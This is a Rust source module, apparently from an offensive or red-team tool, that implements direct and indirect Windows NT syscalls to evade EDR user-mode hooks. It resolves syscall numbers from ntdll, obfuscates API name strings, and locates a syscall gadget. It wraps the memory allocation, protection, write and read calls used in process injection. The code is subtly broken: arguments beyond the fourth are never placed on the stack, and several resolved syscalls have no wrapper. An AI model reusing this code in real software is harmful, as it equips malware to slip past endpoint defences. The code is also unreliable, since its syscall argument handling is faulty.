//! Indirect syscall module for bypassing user-mode API hooks.
//!
//! This module provides wrappers around NT syscalls that bypass the standard
//! Windows API layer, making it harder for EDR products that rely on user-mode
//! hooking to intercept calls.
//!
//! Techniques used:
//! - Direct syscall invocation via assembly stubs
//! - SSN (System Service Number) resolution from ntdll
//! - Indirect syscall through legitimate ntdll gadgets
//!
//! Detectable telemetry generated:
//! - Unusual call stacks (missing kernel32/ntdll frames)
//! - Direct syscall instruction patterns
//! - Memory access to ntdll .text section

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use std::arch::asm;
use std::ffi::c_void;
use std::mem::MaybeUninit;
use std::ptr::null_mut;

use winapi::shared::ntdef::{HANDLE, NTSTATUS, OBJECT_ATTRIBUTES, PVOID, ULONG};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
use winapi::um::winnt::{
    ACCESS_MASK, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64,
    LARGE_INTEGER, PLARGE_INTEGER,
};

/// Status code for successful NT operations
pub const STATUS_SUCCESS: NTSTATUS = 0;

/// Syscall numbers resolved at runtime
struct SyscallTable {
    nt_allocate_virtual_memory: u16,
    nt_protect_virtual_memory: u16,
    nt_write_virtual_memory: u16,
    nt_read_virtual_memory: u16,
    nt_create_thread_ex: u16,
    nt_query_system_information: u16,
    nt_open_process: u16,
    nt_close: u16,
    nt_delay_execution: u16,
}

/// Global syscall table (initialized lazily)
static mut SYSCALL_TABLE: Option<SyscallTable> = None;

/// Initialize the syscall table by resolving SSNs from ntdll
pub fn init_syscalls() -> Result<(), &'static str> {
    unsafe {
        if SYSCALL_TABLE.is_some() {
            return Ok(());
        }

        let table = SyscallTable {
            nt_allocate_virtual_memory: resolve_ssn(obfstr::obfstr!("NtAllocateVirtualMemory"))?,
            nt_protect_virtual_memory: resolve_ssn(obfstr::obfstr!("NtProtectVirtualMemory"))?,
            nt_write_virtual_memory: resolve_ssn(obfstr::obfstr!("NtWriteVirtualMemory"))?,
            nt_read_virtual_memory: resolve_ssn(obfstr::obfstr!("NtReadVirtualMemory"))?,
            nt_create_thread_ex: resolve_ssn(obfstr::obfstr!("NtCreateThreadEx"))?,
            nt_query_system_information: resolve_ssn(obfstr::obfstr!("NtQuerySystemInformation"))?,
            nt_open_process: resolve_ssn(obfstr::obfstr!("NtOpenProcess"))?,
            nt_close: resolve_ssn(obfstr::obfstr!("NtClose"))?,
            nt_delay_execution: resolve_ssn(obfstr::obfstr!("NtDelayExecution"))?,
        };

        SYSCALL_TABLE = Some(table);
        Ok(())
    }
}

/// Resolve the System Service Number (SSN) for an NT function
///
/// This function locates the syscall number by parsing the function's
/// prologue in ntdll. The SSN is stored in the `mov eax, XXX` instruction.
unsafe fn resolve_ssn(func_name: &str) -> Result<u16, &'static str> {
    let ntdll = GetModuleHandleA(obfstr::obfstr!("ntdll.dll\0").as_ptr() as *const i8);
    if ntdll.is_null() {
        return Err("Failed to get ntdll handle");
    }

    // Need null-terminated string for GetProcAddress
    let mut name_buf = [0u8; 64];
    let name_bytes = func_name.as_bytes();
    if name_bytes.len() >= name_buf.len() {
        return Err("Function name too long");
    }
    name_buf[..name_bytes.len()].copy_from_slice(name_bytes);

    let func_addr = GetProcAddress(ntdll, name_buf.as_ptr() as *const i8);
    if func_addr.is_null() {
        return Err("Failed to resolve function");
    }

    // Parse the function prologue to find the SSN
    // Pattern: mov r10, rcx; mov eax, SSN
    // Bytes: 4C 8B D1 B8 XX XX 00 00
    let bytes = std::slice::from_raw_parts(func_addr as *const u8, 24);

    // Look for mov eax pattern (B8 XX XX 00 00)
    for i in 0..20 {
        if bytes[i] == 0xB8 && bytes[i + 3] == 0x00 && bytes[i + 4] == 0x00 {
            let ssn = u16::from_le_bytes([bytes[i + 1], bytes[i + 2]]);
            return Ok(ssn);
        }
    }

    Err("Failed to find SSN pattern")
}

/// Find a syscall;ret gadget in ntdll for indirect syscalls
///
/// Instead of executing syscall directly (which is suspicious),
/// we jump to a legitimate syscall instruction in ntdll.
unsafe fn find_syscall_gadget() -> Option<usize> {
    let ntdll = GetModuleHandleA(obfstr::obfstr!("ntdll.dll\0").as_ptr() as *const i8);
    if ntdll.is_null() {
        return None;
    }

    let dos_header = ntdll as *const IMAGE_DOS_HEADER;
    let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize)
        as *const IMAGE_NT_HEADERS64;
    let text_size = (*nt_headers).OptionalHeader.SizeOfCode as usize;

    let text_bytes = std::slice::from_raw_parts(ntdll as *const u8, text_size);

    // Search for syscall; ret (0F 05 C3)
    for i in 0..text_size.saturating_sub(3) {
        if text_bytes[i] == 0x0F && text_bytes[i + 1] == 0x05 && text_bytes[i + 2] == 0xC3 {
            return Some(ntdll as usize + i);
        }
    }

    None
}

/// Execute an indirect syscall
///
/// This macro sets up the syscall and jumps to a legitimate syscall
/// instruction in ntdll, making the call stack appear more legitimate.
#[macro_export]
macro_rules! indirect_syscall {
    ($ssn:expr, $($arg:expr),*) => {{
        unsafe {
            let gadget = $crate::syscalls::get_syscall_gadget();
            $crate::syscalls::do_syscall($ssn, gadget, &[$($arg as usize),*])
        }
    }};
}

/// Cached syscall gadget address
static mut SYSCALL_GADGET: usize = 0;

/// Get or initialize the syscall gadget
pub unsafe fn get_syscall_gadget() -> usize {
    if SYSCALL_GADGET == 0 {
        SYSCALL_GADGET = find_syscall_gadget().unwrap_or(0);
    }
    SYSCALL_GADGET
}

/// Perform an indirect syscall with the given SSN and arguments
///
/// # Safety
/// Caller must ensure arguments are valid for the syscall being invoked.
#[inline(never)]
pub unsafe fn do_syscall(ssn: u16, gadget: usize, args: &[usize]) -> NTSTATUS {
    let result: i32;

    // Windows x64 syscall convention:
    // RAX = syscall number
    // RCX, RDX, R8, R9 = first 4 args
    // Stack = remaining args (with shadow space)

    let arg0 = args.get(0).copied().unwrap_or(0);
    let arg1 = args.get(1).copied().unwrap_or(0);
    let arg2 = args.get(2).copied().unwrap_or(0);
    let arg3 = args.get(3).copied().unwrap_or(0);

    if gadget == 0 {
        // Direct syscall fallback (more detectable)
        asm!(
            "mov r10, rcx",
            "syscall",
            inout("eax") ssn as i32 => result,
            in("rcx") arg0,
            in("rdx") arg1,
            in("r8") arg2,
            in("r9") arg3,
            out("r10") _,
            out("r11") _,
            clobber_abi("win64"),
        );
    } else {
        // Indirect syscall through ntdll gadget
        asm!(
            "mov r10, rcx",
            "call {gadget}",
            gadget = in(reg) gadget,
            inout("eax") ssn as i32 => result,
            in("rcx") arg0,
            in("rdx") arg1,
            in("r8") arg2,
            in("r9") arg3,
            out("r10") _,
            out("r11") _,
            clobber_abi("win64"),
        );
    }

    result
}

// ============================================================================
// Wrapper functions for common NT operations
// ============================================================================

/// Allocate virtual memory using direct syscall
pub unsafe fn nt_allocate_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: ULONG,
    protect: ULONG,
) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(
        table.nt_allocate_virtual_memory,
        process_handle,
        base_address,
        zero_bits,
        region_size,
        allocation_type,
        protect
    )
}

/// Protect virtual memory using direct syscall
pub unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base_address: *mut PVOID,
    region_size: *mut usize,
    new_protect: ULONG,
    old_protect: *mut ULONG,
) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(
        table.nt_protect_virtual_memory,
        process_handle,
        base_address,
        region_size,
        new_protect,
        old_protect
    )
}

/// Write to virtual memory using direct syscall
pub unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    size: usize,
    bytes_written: *mut usize,
) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(
        table.nt_write_virtual_memory,
        process_handle,
        base_address,
        buffer,
        size,
        bytes_written
    )
}

/// Read from virtual memory using direct syscall
pub unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base_address: PVOID,
    buffer: PVOID,
    size: usize,
    bytes_read: *mut usize,
) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(
        table.nt_read_virtual_memory,
        process_handle,
        base_address,
        buffer,
        size,
        bytes_read
    )
}

/// Close handle using direct syscall
pub unsafe fn nt_close(handle: HANDLE) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(table.nt_close, handle)
}

/// Delay execution (sleep) using direct syscall
pub unsafe fn nt_delay_execution(alertable: bool, delay_interval: *mut i64) -> NTSTATUS {
    let table = SYSCALL_TABLE.as_ref().expect("Syscalls not initialized");
    indirect_syscall!(
        table.nt_delay_execution,
        alertable as usize,
        delay_interval
    )
}

/// Sleep for specified milliseconds using NtDelayExecution syscall
pub fn syscall_sleep(milliseconds: u32) {
    unsafe {
        // Negative value = relative time in 100ns units
        let mut delay: i64 = -((milliseconds as i64) * 10000);
        let _ = nt_delay_execution(false, &mut delay);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ssn_resolution() {
        unsafe {
            // NtClose typically has a low SSN (around 0x0F)
            let ssn = resolve_ssn("NtClose");
            assert!(ssn.is_ok());
            assert!(ssn.unwrap() < 0x200); // SSNs are typically < 512
        }
    }
}
